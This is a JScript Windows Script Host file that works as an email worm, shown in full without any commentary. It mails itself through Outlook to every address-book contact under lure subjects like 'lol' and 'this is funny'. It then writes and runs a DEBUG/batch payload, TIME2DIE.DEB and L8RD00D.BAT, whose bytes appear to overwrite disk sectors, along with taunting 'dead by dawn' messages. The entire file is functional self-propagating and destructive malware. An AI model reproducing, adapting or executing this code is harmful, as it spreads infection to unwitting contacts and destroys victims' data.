var i,x,y,outlook,mapi,fso,mail,debug,shell;
var subject=new Array("check it out guys!","this is funny","lol","haha!");

function attach()
{
  mail.Attachments.Add(WScript.ScriptFullName);
}

try
{
  try
  {
    outlook=WScript.CreateObject("Outlook.Application");
    mapi=outlook.GetNamespace("MAPI");

    i=0;

    for(y=1;y<=mapi.AddressLists.Count;y++)
    {
      for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++)
      {
        if (i==15)
        {
          mail.Send
          i=0;
        }
        if (i==0)
        {
          mail=outlook.CreateItem(0);
          mail.Subject=subject[Math.round(Math.random()*3)];
          attach()
        }
        mail.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));
        i++;
      }
    }
    if (i!=0) mail.Send
  }
  finally
  {
    WScript.Echo("We are the things that were and shall be again..\nWe want what is your's.. life!\nHahaha, dead by dawn, dead by dawn!");

    fso=WScript.CreateObject("Scripting.FileSystemObject");
    debug=fso.CreateTextFile("TIME2DIE.DEB");

    debug.WriteLine("E 0100 B8 13 35 CD 21 89 1E 1D 01 8C 06 1F 01 0E 07 BB");
    debug.WriteLine("E 0110 28 01 B9 02 00 BA 80 00 B8 01 03 9C 9A 00 00 00");
    debug.WriteLine("E 0120 00 FE C6 75 F3 42 EB F0 48 69 21 00");
    debug.WriteLine("G");
    debug.Close();

    debug=fso.CreateTextFile("L8RD00D.BAT");
    debug.WriteLine("DEBUG<TIME2DIE.DEB>NUL");
    debug.Close();

    shell=WScript.CreateObject("WScript.Shell");
    shell.Run("L8RD00D.BAT");
  }
}
catch(i)
{
  WScript.Echo("Oh well.. so you're lucky this time..");
}
